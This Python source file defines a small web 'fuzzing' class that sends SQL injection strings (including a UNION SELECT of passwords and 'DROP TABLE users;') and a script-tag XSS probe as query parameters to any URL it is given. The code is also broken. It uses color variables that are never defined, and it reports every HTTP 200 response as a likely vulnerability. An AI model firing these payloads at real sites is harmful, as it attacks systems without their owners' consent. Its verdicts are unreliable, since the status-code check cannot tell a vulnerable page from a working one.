import random
import string
import requests

class Fuzzing:
    def __init__(self):
        self.payloads = [
            "' OR 1=1 --", 
            "<script>alert('XSS')</script>", 
            "DROP TABLE users;", 
            "' OR 'a'='a' --", 
            "admin' UNION SELECT null, password FROM users --"
        ]
        self.parameters = ["input", "search", "id", "user", "comment"]

    def fuzz_url(self, url):
        parameter = random.choice(self.parameters)
        payload = random.choice(self.payloads)
        fuzzed_url = f"{url}?{parameter}={payload}"
        response = requests.get(fuzzed_url)
        
        print(f"Fuzzing {parameter} with payload: {payload}")
        print(f"Response Status: {response.status_code}, URL: {fuzzed_url}")

        if response.status_code == 200:
            print(f"{G}Potential vulnerability detected at: {fuzzed_url}{N}")
        else:
            print(f"{R}No vulnerability detected at: {fuzzed_url}{N}")

    def multi_fuzz(self, url, num_requests=10):
        for _ in range(num_requests):
            self.fuzz_url(url)
